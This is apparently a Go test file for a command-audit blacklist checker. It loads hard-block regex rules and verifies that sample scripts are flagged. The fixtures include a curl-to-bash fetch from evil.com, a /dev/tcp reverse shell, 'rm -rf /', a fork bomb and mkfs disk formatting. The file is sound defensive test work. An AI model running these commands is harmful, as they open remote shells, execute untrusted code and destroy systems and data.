package checker

import (
	"os"
	"testing"

	"api-server/internal/model"
	"api-server/pkg/logger"

	"github.com/google/uuid"
	"go.uber.org/zap"
)

func TestMain(m *testing.M) {
	logger.Logger = zap.NewNop()
	logger.Sugar = logger.Logger.Sugar()
	os.Exit(m.Run())
}

func loadTestRules(t *testing.T) *BlacklistChecker {
	t.Helper()
	c := NewBlacklistChecker()
	rules := []model.CommandAuditRule{
		{
			ID:        uuid.New(),
			Name:      "管道执行远程脚本",
			RuleType:  "hard_block",
			MatchType: "regex",
			Pattern:   `(curl|wget).*\|\s*(bash|sh|zsh)`,
			Category:  "network",
			Severity:  "critical",
			AppliesTo: model.StringArray{"all"},
			IsPreset:  true,
			IsEnabled: true,
		},
		{
			ID:        uuid.New(),
			Name:      "递归删除根目录",
			RuleType:  "hard_block",
			MatchType: "regex",
			Pattern:   `rm\s+(-[a-zA-Z]*r[a-zA-Z]*f|-[a-zA-Z]*f[a-zA-Z]*r)\s+/`,
			Category:  "filesystem",
			Severity:  "critical",
			AppliesTo: model.StringArray{"all"},
			IsPreset:  true,
			IsEnabled: true,
		},
		{
			ID:        uuid.New(),
			Name:      "Bash反弹Shell",
			RuleType:  "hard_block",
			MatchType: "regex",
			Pattern:   `bash\s+-i\s+>&\s+/dev/tcp/`,
			Category:  "network",
			Severity:  "critical",
			AppliesTo: model.StringArray{"all"},
			IsPreset:  true,
			IsEnabled: true,
		},
		{
			ID:        uuid.New(),
			Name:      "Fork炸弹",
			RuleType:  "hard_block",
			MatchType: "exact",
			Pattern:   `:(){ :|:& };:`,
			Category:  "system",
			Severity:  "critical",
			AppliesTo: model.StringArray{"all"},
			IsPreset:  true,
			IsEnabled: true,
		},
		{
			ID:        uuid.New(),
			Name:      "格式化磁盘",
			RuleType:  "hard_block",
			MatchType: "regex",
			Pattern:   `mkfs\.`,
			Category:  "filesystem",
			Severity:  "critical",
			AppliesTo: model.StringArray{"all"},
			IsPreset:  true,
			IsEnabled: true,
		},
	}
	if err := c.LoadRules(rules); err != nil {
		t.Fatalf("failed to load rules: %v", err)
	}
	return c
}

func TestCheck_CurlPipeBashBlocked(t *testing.T) {
	c := loadTestRules(t)
	script := `#!/bin/bash
curl http://evil.com/malware.sh | bash
echo "done"
`
	result, err := c.Check(script, "all")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if !result.HasViolation {
		t.Fatal("expected curl | bash to be blocked")
	}
	if !result.HasHardBlock() {
		t.Fatal("expected hard_block violation")
	}
	if result.Hits[0].LineNumber != 2 {
		t.Fatalf("expected line 2, got %d", result.Hits[0].LineNumber)
	}
}

func TestCheck_CleanScriptPasses(t *testing.T) {
	c := loadTestRules(t)
	script := `#!/bin/bash
echo "hello world"
ls -la /tmp
`
	result, err := c.Check(script, "all")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if result.HasViolation {
		t.Fatalf("expected clean script to pass, got hits: %v", result.Hits)
	}
}

func TestCheck_RmRfRootBlocked(t *testing.T) {
	c := loadTestRules(t)
	script := `#!/bin/bash
rm -rf /
echo "destroyed"
`
	result, err := c.Check(script, "all")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if !result.HasViolation {
		t.Fatal("expected rm -rf / to be blocked")
	}
}

func TestCheck_BashReverseShellBlocked(t *testing.T) {
	c := loadTestRules(t)
	script := `#!/bin/bash
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
`
	result, err := c.Check(script, "all")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if !result.HasViolation {
		t.Fatal("expected bash reverse shell to be blocked")
	}
}

func TestCheck_ForkBombBlocked(t *testing.T) {
	c := loadTestRules(t)
	script := `:(){ :|:& };:`
	result, err := c.Check(script, "all")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if !result.HasViolation {
		t.Fatal("expected fork bomb to be blocked")
	}
}

func TestCheck_MkfsBlocked(t *testing.T) {
	c := loadTestRules(t)
	script := `#!/bin/bash
mkfs.ext4 /dev/sda1
`
	result, err := c.Check(script, "all")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if !result.HasViolation {
		t.Fatal("expected mkfs to be blocked")
	}
}

func TestCheck_CommentsIgnored(t *testing.T) {
	c := loadTestRules(t)
	script := `#!/bin/bash
# curl http://evil.com | bash
echo "this is safe"
`
	result, err := c.Check(script, "all")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if result.HasViolation {
		t.Fatal("expected comments to be ignored")
	}
}

func TestCheck_DisabledRuleIgnored(t *testing.T) {
	c := NewBlacklistChecker()
	rules := []model.CommandAuditRule{
		{
			ID:        uuid.New(),
			Name:      "Disabled rule",
			RuleType:  "hard_block",
			MatchType: "regex",
			Pattern:   `curl`,
			Category:  "network",
			Severity:  "critical",
			AppliesTo: model.StringArray{"all"},
			IsPreset:  true,
			IsEnabled: false, // disabled
		},
	}
	if err := c.LoadRules(rules); err != nil {
		t.Fatalf("failed to load rules: %v", err)
	}

	result, err := c.Check("curl http://example.com", "all")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if result.HasViolation {
		t.Fatal("expected disabled rule to be ignored")
	}
}

func TestCheck_ScriptTypeFilter(t *testing.T) {
	c := NewBlacklistChecker()
	rules := []model.CommandAuditRule{
		{
			ID:        uuid.New(),
			Name:      "Baseline only rule",
			RuleType:  "hard_block",
			MatchType: "regex",
			Pattern:   `curl`,
			Category:  "network",
			Severity:  "critical",
			AppliesTo: model.StringArray{"baseline_check"}, // only for baseline
			IsPreset:  true,
			IsEnabled: true,
		},
	}
	if err := c.LoadRules(rules); err != nil {
		t.Fatalf("failed to load rules: %v", err)
	}

	// Should block for baseline_check
	result, err := c.Check("curl http://example.com", "baseline_check")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if !result.HasViolation {
		t.Fatal("expected rule to apply to baseline_check")
	}

	// Should NOT block for vulnerability_fix
	result, err = c.Check("curl http://example.com", "vulnerability_fix")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if result.HasViolation {
		t.Fatal("expected rule NOT to apply to vulnerability_fix")
	}
}
